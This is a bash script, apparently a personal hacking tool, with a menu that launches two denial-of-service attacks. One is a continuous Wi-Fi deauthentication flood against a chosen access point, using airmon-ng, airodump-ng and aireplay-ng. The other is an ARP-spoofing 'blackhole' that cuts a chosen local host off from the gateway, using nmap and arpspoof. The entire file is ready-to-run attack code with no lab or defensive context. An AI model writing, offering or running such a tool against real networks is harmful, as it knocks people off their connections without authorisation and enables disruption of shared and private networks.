#!/bin/bash

# Ensure running as root
if [ "$EUID" -ne 0 ]; then
  echo "[-] This script must be run as root."
  exit 1
fi

INTERFACE="wlan0"

show_menu() {
    clear
    cat << "MENU"
 ____        __              _      __       ___ _____ _    
|  _ \ __ _ / _| __ _ _   _ ___( )___  \ \     / (_)  ___(_)   
| |_) / _` | |_ / _` | | | / __|// __|  \ \ /\ / /| | |_  | |   
|  _ < (_| |  _| (_| | |_| \__ \  \__ \   \ V  V / | |  _| | |   
|_| \_\__,_|_|  \__,_|\__, |___/  |___/    \_/\_/  |_|_|  |_|   
                      |___/                                     
================================================================
1) Start Wi-Fi Jammer (Deauth)
2) Jam Single User (ARP Blackhole)
3) Exit
================================================================
MENU
}

cleanup() {
    echo -e "\n[*] Cleaning up and restoring network..."
    pkill -f aireplay-ng 2>/dev/null
    killall arpspoof 2>/dev/null
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    
    if [ -n "$MON_IFACE" ]; then
        airmon-ng stop "$MON_IFACE" 2>/dev/null
    fi
    systemctl restart NetworkManager 2>/dev/null
    echo "[✓] Cleanup complete."
    exit
}

trap cleanup SIGINT

while true; do
    show_menu
    read -p "Select an option [1-3]: " choice
    
    case $choice in
        1)
            echo "[*] Preparing environment..."
            nmcli device disconnect "$INTERFACE" 2>/dev/null
            sleep 1
            airmon-ng check kill 2>/dev/null
            sleep 1
            echo "[*] Starting monitor mode on $INTERFACE..."
            airmon-ng start "$INTERFACE" 2>&1 | grep -i "monitor\|enabled"
            
            MON_IFACE=$(ip link show | grep -oE "wlan[0-9]mon" | head -1)
            if [ -z "$MON_IFACE" ]; then
                MON_IFACE="${INTERFACE}mon"
                iw dev "$INTERFACE" interface add "$MON_IFACE" type monitor 2>/dev/null
                ip link set "$MON_IFACE" up 2>/dev/null
            fi
            
            if ! ip link show "$MON_IFACE" &>/dev/null; then
                echo "[!] Monitor interface creation failed."
                sleep 2; continue
            fi
            
            echo "[✓] Monitor interface: $MON_IFACE"
            echo "[*] Scanning... (Hit Ctrl+C to stop scanning)"
            airodump-ng "$MON_IFACE" 2>/dev/null
            
            read -p "Enter Target BSSID: " BSSID
            read -p "Enter Channel: " CH
            
            if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
                iwconfig "$MON_IFACE" channel "$CH" 2>/dev/null
                echo "[*] Jamming active on $BSSID..."
                aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE"
            else
                echo "[!] Invalid BSSID."
            fi
            ;;

        2)
            echo "[*] Scanning for targets..."
            sudo nmap -sn 192.168.1.0/24 | grep -E "Nmap scan report for|MAC Address:"
            read -p "[?] Enter Target IP: " TARGET_IP
            
            echo "[*] Engaging Blackhole for $TARGET_IP..."
            echo 0 > /proc/sys/net/ipv4/ip_forward
            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "192.168.1.1" > /dev/null 2>&1 &
            arpspoof -i "$INTERFACE" -t "192.168.1.1" "$TARGET_IP" > /dev/null 2>&1 &
            
            echo "[!] Attack active. Press [CTRL+C] to stop."
            while true; do sleep 1; done
            ;;

        3)
            cleanup
            ;;
        *)
            echo "Invalid option"
            sleep 1
            ;;
    esac
done
